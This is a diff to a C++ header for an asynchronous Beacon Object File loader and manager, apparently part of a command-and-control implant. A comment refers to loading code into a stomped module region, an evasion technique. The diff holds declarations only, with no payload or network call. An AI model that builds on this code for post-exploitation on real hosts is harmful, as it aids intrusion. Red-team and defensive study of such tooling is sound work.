@@ -3,6 +3,8 @@
 #include "std.cpp"
 #include "Packer.h"
 #include "ApiLoader.h"
+#include "bof_loader.h"
+#include "config.h"
 
 #define ASYNC_BOF_STATE_PENDING   0x0
 #define ASYNC_BOF_STATE_RUNNING   0x1
@@ -17,59 +19,54 @@ struct AsyncBofContext {
     HANDLE  hThread;
     DWORD   threadId;
     HANDLE  hStopEvent;
-    
+
     BYTE*   coffFile;
     ULONG   coffFileSize;
     BYTE*   args;
     ULONG   argsSize;
     CHAR*   entryName;
-    
+
     CRITICAL_SECTION outputLock;
     Packer* outputBuffer;
-    
+
     PCHAR   mapSections[25];
-    LPVOID* mapFunctions;
+    LPVOID  mapFunctions;   /* now typed as LPVOID — pointer into stomp region or VirtualAlloc */
 };
 
 extern __declspec(thread) AsyncBofContext* tls_CurrentBofContext;
-
-
 
 class Boffer
 {
 public:
     Vector<AsyncBofContext*> asyncBofs;
-    
-    HANDLE  wakeupEvent;
+
+    HANDLE           wakeupEvent;
     CRITICAL_SECTION managerLock;
-    
+
     Boffer();
     ~Boffer();
-    
+
     BOOL Initialize();
-    
-    AsyncBofContext* CreateAsyncBof(ULONG taskId, CHAR* entryName, BYTE* coffFile, ULONG coffFileSize, BYTE* args, ULONG argsSize);
-    
+
+    AsyncBofContext* CreateAsyncBof(ULONG taskId, CHAR* entryName, BYTE* coffFile,
+                                    ULONG coffFileSize, BYTE* args, ULONG argsSize);
+
     BOOL StartAsyncBof(AsyncBofContext* ctx);
-    
     BOOL StopAsyncBof(ULONG taskId);
-    
+
     void ProcessAsyncBofs(Packer* outPacker);
-    
     void CleanupFinishedBofs();
-    
+
     AsyncBofContext* FindBofByThreadId(DWORD threadId);
-    
+
     HANDLE GetWakeupEvent();
-    
-    void SignalWakeup();
-        
+    void   SignalWakeup();
+
     static void* operator new(size_t sz);
-    static void operator delete(void* p) noexcept;
-    
+    static void  operator delete(void* p) noexcept;
+
 private:
     void CleanupBofContext(AsyncBofContext* ctx);
 };
 
 extern Boffer* g_AsyncBofManager;
-
